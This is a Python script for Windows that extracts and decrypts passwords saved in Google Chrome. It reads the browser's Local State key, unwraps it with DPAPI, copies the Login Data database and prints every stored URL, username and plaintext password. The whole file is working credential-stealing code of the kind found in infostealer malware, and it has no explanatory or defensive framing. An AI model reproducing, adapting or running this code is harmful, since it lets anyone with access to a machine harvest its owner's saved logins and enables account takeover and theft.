import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_chrome_local_state():
    local_state_path = os.path.join(os.environ['USERPROFILE'],
                                    r'AppData\Local\Google\Chrome\User Data\Local State')
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    return local_state

def get_secret_key():
    local_state = get_chrome_local_state()
    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    # Remove DPAPI prefix
    encrypted_key = encrypted_key[5:]
    # Decrypt key with Windows DPAPI
    secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return secret_key

def decrypt_password(buff, secret_key):
    try:
        # Encrypted passwords are prefixed with 'v10' (3 bytes)
        iv = buff[3:15]
        payload = buff[15:-16]
        tag = buff[-16:]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt_and_verify(payload, tag)
        return decrypted_pass.decode()  # Decode to string
    except Exception as e:
        # Could be DPAPI encryption (older versions)
        try:
            decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
            return decrypted_pass.decode()
        except:
            return ""

def main():
    secret_key = get_secret_key()
    login_db_path = os.path.join(os.environ['USERPROFILE'],
                                 r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
    # Copy file to avoid lock
    shutil.copy2(login_db_path, "Loginvault.db")

    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        if url and username and encrypted_password:
            password = decrypt_password(encrypted_password, secret_key)
            print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n{'-'*50}")

    cursor.close()
    conn.close()
    os.remove("Loginvault.db")

if __name__ == "__main__":
    main()
